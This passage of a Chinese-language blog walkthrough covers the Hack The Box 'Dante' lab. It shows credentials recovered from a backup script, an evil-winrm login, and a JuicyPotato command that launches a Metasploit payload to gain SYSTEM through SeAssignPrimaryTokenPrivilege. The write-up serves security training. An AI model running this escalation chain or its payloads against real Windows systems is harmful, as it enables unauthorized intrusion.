&quot;</span>.sql<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$execute_sqldump</span> = <span class="variable">$sqldumpLocation</span>+&quot;</span> <span class="literal">-u</span><span class="string">&quot;+<span class="variable">$cred</span>.UserName+&quot;</span> <span class="literal">-p</span><span class="string">&quot;+<span class="variable">$cred</span>.Password +&quot;</span> &gt; <span class="string">&quot; + <span class="variable">$backupDest</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">invoke-expression <span class="variable">$execute_sqldump</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># use 7zip to compress and encrypt the backup with same password as used to autheticate the sql backup user</span></span><br><span class="line"><span class="string"># removes the unencrypted .sql file afterwards</span></span><br><span class="line"><span class="string"># create symbolic link for 7z.exe in the script folder</span></span><br><span class="line"><span class="string"><span class="variable">$sevenzip</span> = &quot;</span>.<span class="comment">#7z.exe&quot;</span></span><br><span class="line"><span class="variable">$zipfile</span> = <span class="variable">$backupDest</span>.Replace(<span class="string">&quot;.sql&quot;</span>,<span class="string">&quot;.7z&quot;</span>)</span><br><span class="line"><span class="variable">$execute7zip</span> = <span class="variable">$sevenzip</span>+<span class="string">&quot; a -t7z &quot;</span>+<span class="variable">$zipfile</span>+<span class="string">&quot; &quot;</span>+<span class="variable">$backupDest</span>+<span class="string">&quot; -p&quot;</span>+<span class="variable">$cred</span>.Password</span><br><span class="line"><span class="built_in">invoke-expression</span> <span class="variable">$execute7zip</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="variable">$backupDest</span></span><br></pre></td></tr></table></figure>
+
+<p>找到一组系统密码<code>sophie:Alltheleavesarebrown1</code>，接着我们用evil-winrm连接一下：</p>
+<p><img src="https://pic.imgdb.cn/item/6462a1390d2dde5777056a7b.jpg"></p>
+<p>连接成功，在Users目录下看到flag。</p>
+<h3 id="I-prefer-mine-with-the-skins-on"><a href="#I-prefer-mine-with-the-skins-on" class="headerlink" title="I prefer mine with the skins on"></a>I prefer mine with the skins on</h3><p>接下来我们执行一下<code>whoami /all</code>：</p>
+<p><img src="https://pic.imgdb.cn/item/6462a16b0d2dde57770580e7.jpg"></p>
+<p>发现该用户有SeAssignPrimaryTokenPrivilege特权。我们知道令牌创建进程使用的CreateProcessAsUserA这个API要求用户必须拥有SeAssignPrimaryTokenPrivilege特权，因此接下来我们可以进行令牌窃取以提升至system权限。我这里使用的工具是juicy potato。首先上传juicy potato和msf生成的马，之后执行以下命令反弹meterpreter：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c <span class="string">&quot;JuicyPotato.exe -t u -p C:\Users\sophie\Documents\shell-1243.exe -l 1243 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为我们使用的是CreateProcessAsUserA这个API，因此-t参数的值为u，-c参数为对应操作系统的COM对象的CLSID，这台主机是windows server 2016的，可以选择的对象有COMXblGameSave，其CLSID为{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}。 至此，最后一台主机的system权限也已经拿到了。打完，收工！</p>
+<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>最后贴一波证书吧：</p>
+<p><img src="https://pic.imgdb.cn/item/6462a9f50d2dde57770cfe53.jpg"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://baidu.com">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E9%9D%B6"><span class="toc-number">2.</span> <span class="toc-text">打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">存活主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I%E2%80%99m-nuts-and-bolts-about-you"><span class="toc-number">2.2.</span> <span class="toc-text">I’m nuts and bolts about you</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It%E2%80%99s-easier-this-way"><span class="toc-number">2.3.</span> <span class="toc-text">It’s easier this way</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Show-me-the-way"><span class="toc-number">2.4.</span> <span class="toc-text">Show me the way</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Seclusion-is-an-illusion"><span class="toc-number">2.5.</span> <span class="toc-text">Seclusion is an illusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Snake-it-%E2%80%98til-you-make-it"><span class="toc-number">2.6.</span> <span class="toc-text">Snake it ‘til you make it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Feeling-fintastic"><span class="toc-number">2.7.</span> <span class="toc-text">Feeling fintastic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Let%E2%80%99s-take-this-discussion-elsewhere"><span class="toc-number">2.8.</span> <span class="toc-text">Let’s take this discussion elsewhere</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compare-my-numbers"><span class="toc-number">2.9.</span> <span class="toc-text">Compare my numbers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Again-and-again"><span class="toc-number">2.10.</span> <span class="toc-text">Again and again</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Five-doctors"><span class="toc-number">2.11.</span> <span class="toc-text">Five doctors</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Minus-minus-plus"><span class="toc-number">2.12.</span> <span class="toc-text">Minus + minus &#x3D; plus?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Congratulations-to-a-perfect-pear"><span class="toc-number">2.13.</span> <span class="toc-text">Congratulations to a perfect pear</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MinatoTW-strikes-again"><span class="toc-number">2.14.</span> <span class="toc-text">MinatoTW strikes again</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#That-just-blew-my-mind"><span class="toc-number">2.15.</span> <span class="toc-text">That just blew my mind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Update-the-policy"><span class="toc-number">2.16.</span> <span class="toc-text">Update the policy!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Single-or-double-quotes"><span class="toc-number">2.17.</span> <span class="toc-text">Single or double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#An-open-goal"><span class="toc-number">2.18.</span> <span class="toc-text">An open goal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It%E2%80%99s-getting-hot-in-here"><span class="toc-number">2.19.</span> <span class="toc-text">It’s getting hot in here</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-misconfig-to-rule-them-all"><span class="toc-number">2.20.</span> <span class="toc-text">One misconfig to rule them all</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#We%E2%80%99re-going-in-circles"><span class="toc-number">2.21.</span> <span class="toc-text">We’re going in circles</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-cup-runneth-over"><span class="toc-number">2.22.</span> <span class="toc-text">My cup runneth over</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-do-we-have-here"><span class="toc-number">2.23.</span> <span class="toc-text">What do we have here?!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It-doesn%E2%80%99t-get-any-easier-than-this"><span class="toc-number">2.24.</span> <span class="toc-text">It doesn’t get any easier than this</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fail-2-The-Sequel"><span class="toc-number">2.25.</span> <span class="toc-text">Fail 2: The Sequel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I-prefer-mine-with-the-skins-on"><span class="toc-number">2.26.</span> <span class="toc-text">I prefer mine with the skins on</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6"><span class="toc-number">3.</span> <span class="toc-text">证书</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2023/05/15/htb-dante/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&text=HTB Dante Walkthrough"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&is_video=false&description=HTB Dante Walkthrough"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Dante Walkthrough&body=Check out this article: https://r4inb00w.github.io/2023/05/15/htb-dante/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&name=HTB Dante Walkthrough&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2023/05/15/htb-dante/&t=HTB Dante Walkthrough"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    rainb0w
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://baidu.com">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
